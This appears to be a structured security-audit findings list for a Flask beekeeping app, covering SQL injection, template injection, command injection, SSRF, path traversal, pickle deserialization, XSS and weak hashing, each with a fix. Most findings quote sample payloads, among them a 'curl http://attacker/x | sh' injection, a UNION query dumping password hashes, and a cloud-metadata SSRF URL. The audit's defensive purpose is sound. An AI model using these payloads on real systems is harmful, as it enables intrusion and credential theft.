findings.title: Hardcoded Flask secret_key
findings.detail: app.secret_key is a static string literal baked into source. Flask signs the session cookie with this key; anyone with the source (or who guesses it) can forge a signed session cookie and set arbitrary user_id/role, defeating all session-based auth.
findings.recommendation: Load secret_key from an environment variable / secrets manager; generate a high-entropy random value per deployment and never commit it.

findings.title: MD5 used for password hashing, unsalted
findings.detail: hash_password() returns hashlib.md5(pw).hexdigest() with no salt and no work factor. MD5 is fast and collision-prone; stored hashes (members.password_hash) are trivially cracked via rainbow tables / brute force. verify_password compares the bare MD5.
findings.recommendation: Use a memory-hard password KDF (argon2id / bcrypt / scrypt) with a per-user salt and appropriate cost factor.

findings.title: SQL injection in login via username string concatenation
findings.detail: Tainted source: request.form['username'] in login(). It is concatenated directly into the SQL string ('SELECT * FROM members WHERE username = ' + "'" + username + "'") and executed via db.execute(query). An attacker can supply username like admin' -- or ' OR '1'='1 to bypass authentication or exfiltrate data. Contrast register() (line 142) and current_user() (line 110) which use bound ? parameters and are safe.
findings.recommendation: Use a parameterized query: db.execute("SELECT * FROM members WHERE username = ?", (username,)).

findings.title: IDOR: view_hive fetches any hive by id with no ownership check
findings.detail: Tainted source: hive_id from the URL path in view_hive(). The query 'SELECT * FROM hives WHERE id = ?' filters only by id, never by owner_id, and there is no session-based ownership/role gate. Any authenticated member can enumerate hive_id values and read other members' hives, harvests, and report filenames. Contrast add_harvest() (line 265-268) and add_note() (line 489-492) which correctly add 'AND owner_id = ?'.
findings.recommendation: Add an ownership predicate (WHERE id = ? AND owner_id = ?) or an explicit authorization check before returning the hive.

findings.title: SQL injection in hive search via %-format
findings.detail: Tainted source: request.args['q'] in search_hives(). It is substituted via Python %-formatting into the SQL string ("... WHERE name LIKE '%%%s%%' OR location LIKE '%%%s%%'" % (q, q)) and executed. An attacker can break out of the string literal to perform UNION-based exfiltration (e.g. q = ' UNION SELECT id,username,password_hash,role,email FROM members -- ).
findings.recommendation: Use parameterized LIKE: db.execute("... WHERE name LIKE ? OR location LIKE ?", (f"%{q}%", f"%{q}%")).

findings.title: Incomplete upload allowlist: only checks final extension, ignores path separators
findings.detail: allowed_file() splits on '.' and checks only the last segment against ALLOWED_EXTENSIONS. It never strips/rejects path separators, so a filename such as '../../evil.pdf' passes the extension allowlist while still containing traversal components. Double-extension and case tricks also slip through depending on serving config. This is the validation half of the upload traversal chain (see FA-0007).
findings.recommendation: Validate against an allowlist of the basename only (use os.path.basename / werkzeug.secure_filename), reject names containing path separators or '..', and verify content type.

findings.title: Path traversal: raw uploaded filename joined to UPLOAD_DIR
findings.detail: Tainted source: f.filename (attacker-controlled multipart filename) in upload_report(). It is passed to os.path.join(UPLOAD_DIR, f.filename) with no basename extraction or normalization, then f.save(save_path). A filename like '../../app.py' escapes UPLOAD_DIR and overwrites arbitrary files the process can write. The allowed_file() check (FA-0006) does not block separators. The traversal also cascades into download_report() (line 343) since the stored filename is reused there.
findings.recommendation: Use werkzeug.utils.secure_filename(f.filename) (or os.path.basename) and confirm the resolved real path stays within UPLOAD_DIR before saving.

findings.title: Server-Side Template Injection via bio in render_template_string
findings.detail:
Tainted source: request.form['bio'] in profile(). It is concatenated into the template SOURCE string (tmpl = "...

" + bio + "

") and passed to render_template_string(tmpl, ...). Jinja2 then evaluates attacker expressions, e.g. {{ config }} leaks config, and {{ ''.__class__.__mro__[1].__subclasses__() }} chains lead to RCE. This is distinct from safe templates that pass user data as a context variable.
findings.recommendation: Never build template source from user input. Render a fixed template and pass bio as a context variable so it is auto-escaped: render_template_string(PROFILE_VIEW_TMPL, bio=bio).

findings.title: OS command injection in export_log via format param to os.system
findings.detail: Tainted source: request.args['format'] in export_log(). It is concatenated into a shell string passed to os.system('hivetrack-export --format ' + fmt + ' --output ' + outfile). An attacker (admin role required) supplies fmt = 'csv; curl http://attacker/x | sh' to run arbitrary commands. Although gated by role == 'admin', the secret-key forgery (FA-0001) and login SQLi (FA-0003) let an attacker reach admin; still a genuine injection sink.
findings.recommendation: Avoid the shell: use subprocess.run([...], shell=False) with an argument list, and validate fmt against a strict allowlist (e.g. {'csv','json'}).

findings.title: SSRF: user-supplied URL passed directly to requests.get
findings.detail: Tainted source: request.args['location_url'] in weather(). It is passed unvalidated to requests.get(location_url) and the first 2000 bytes of the response are returned to the user. An attacker supplies http://169.254.169.254/latest/meta-data/ (cloud metadata), http://localhost:.../ internal services, or file/gopher-style targets, enabling internal network probing and credential theft.
findings.recommendation: Restrict to an allowlist of weather hosts/schemes, resolve and block private/link-local/loopback IP ranges, and disable redirects.

findings.title: Open redirect: startswith host check bypassable
findings.detail: Tainted source: request.args['to'] in external_redirect(), validated by is_safe_redirect(). The host is extracted with url.split('//',1)[1].split('/')[0] and matched with host.startswith(safe) rather than exact equality. 'hivetrack.example.com.evil.net'.startswith('hivetrack.example.com') is True, so http://hivetrack.example.com.evil.net/ passes and redirect() sends the victim to the attacker domain. Relative URLs are also blanket-trusted.
findings.recommendation: Parse with urllib.parse.urlparse and compare the netloc with exact equality against the allowlist (== or in a set), and constrain relative redirects to known local paths.

findings.title: Insecure deserialization: pickle.loads on raw request body
findings.detail: Tainted source: request.get_data() (raw request body) in import_snapshot(). It is passed to pickle.loads(raw). A crafted pickle payload defining __reduce__ executes arbitrary code (RCE) on the server during unpickling, before any of the dict access below runs. Role == 'admin' gate exists but does not mitigate the deserialization primitive itself.
findings.recommendation: Never unpickle untrusted input. Use a safe format (JSON) for snapshot import and validate the schema.

findings.title: Stored XSS: note content rendered with |safe filter
findings.detail: Tainted source: request.form['note'] in add_note(); it is stored unsanitized into hives.notes (line 496) and later rendered in HIVE_DETAIL_TMPL as {{ hive['notes']|safe }} (line 617), which disables Jinja2 auto-escaping. An attacker stores <script>...</script> that executes in any viewer's browser. The ownership check on write is correct, but combined with the view_hive IDOR (FA-0004) the rendered note is exposed to other users. Sink span: line 617 in the template.
findings.recommendation: Remove the |safe filter so the value is auto-escaped, and/or sanitize HTML with a strict allowlist (e.g. bleach) on input.

findings.title: Two-hop command injection: unanchored regex lets queen_tag reach shell
findings.detail: Tainted source: request.form['queen_tag'] in register_queen(). It is 'validated' by parse_queen_tag() whose regex r'^\d{4}-[A-Z]\d{3}-[A-Z0-9]+' uses re.match, which is anchored only at the start (no $). So '2024-Q001-NZ42; rm -rf /tmp/x' passes validation; parts = raw_tag.split('-', 2) puts everything after the 2nd dash into hive_code, carrying the injected metacharacters. Hop 2: hive_code is interpolated into subprocess.run(f'queen-registry --register {hive_code}', shell=True), executing arbitrary commands.
findings.recommendation: Anchor the regex at both ends (add $), and invoke the command with shell=False and an argument list: subprocess.run(['queen-registry','--register',hive_code]).
